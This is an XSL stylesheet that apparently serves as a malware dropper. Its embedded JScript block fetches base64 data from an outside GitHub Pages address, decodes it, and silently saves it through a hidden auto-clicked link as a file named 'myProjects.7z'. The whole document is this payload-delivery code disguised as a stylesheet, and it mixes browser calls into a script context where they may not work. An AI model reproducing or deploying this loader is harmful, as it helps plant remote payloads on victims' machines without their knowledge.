<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	function base64ToArrayBuffer(base64) {
	    var binary_string = window.atob(base64);
	    var len = binary_string.length;
	    var bytes = new Uint8Array(len);
	    for (var i = 0; i < len; i++) {
		bytes[i] = binary_string.charCodeAt(i);
	    }
	    return bytes.buffer;
	}

	function load(url) {
	    fetch(url)
		.then((response) => response.text())
		.then((abc) => {
		    var data = base64ToArrayBuffer(abc);
		    var blob = new Blob([data], {
			type: 'octet/stream'
		    });
		    var fileName = 'myProjects.7z';
		    if (window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob, fileName);
		    else {
			var a = document.createElement('a');
			document.body.appendChild(a);
			a.style = 'display: none';
			var url = window.URL.createObjectURL(blob);
			a.href = url;
			a.download = fileName;
			a.click();
			window.URL.revokeObjectURL(url);
		    }
		})
		.catch((error) => console.error(error));
	}
	load('https://tylerhill12.github.io/mDi8aWs');
	]]> </ms:script>
</stylesheet>
